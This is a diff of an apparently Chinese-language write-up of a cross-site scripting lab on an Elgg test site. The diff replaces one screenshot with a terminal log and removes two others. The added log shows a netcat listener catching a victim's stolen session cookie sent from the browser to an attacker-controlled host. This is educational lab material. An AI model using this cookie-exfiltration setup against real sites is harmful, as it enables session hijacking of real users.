@@ -72,7 +72,19 @@ nc -lknv 5555
 
 登录 Alice 账号，点进 Samy 的 profile，看到返回了 cookie
 
-<img src="/assets/post/images/xss6.webp" alt="xss6" style="zoom: 50%;" />
+```shell
+$ nc -lknv 5555
+Listening on 0.0.0.0 5555
+Connection received on 10.0.2.7 55392
+GET /?c=Elgg%3Damcqsah6m5s1nd3tfuiff0a6vv HTTP/1.1
+Host: 10.9.0.1:5555
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://www.seed-server.com/profile/samy
+```
 
 ## Task 4: Becoming the Victim’s Friend
 
@@ -231,8 +243,6 @@ nc -lknv 5555
 </VirtualHost>
 ```
 
-<img src="/assets/post/images/xss17.webp" alt="xss17" style="zoom:50%;" />
-
 看到 [example32b.com](http://www.example32b.com) 的 4、5、6 变成了 OK
 
 <img src="/assets/post/images/xss18.webp" alt="xss18" style="zoom:67%;" />
@@ -249,8 +259,6 @@ nc -lknv 5555
     
 <?php include 'index.html';?>
 ```
-
-<img src="/assets/post/images/xss19.webp" alt="xss19" style="zoom:50%;" />
 
 看到 [example32c.com](http://www.example32c.com) 的 1、2、4、5、6 变成了 OK
 
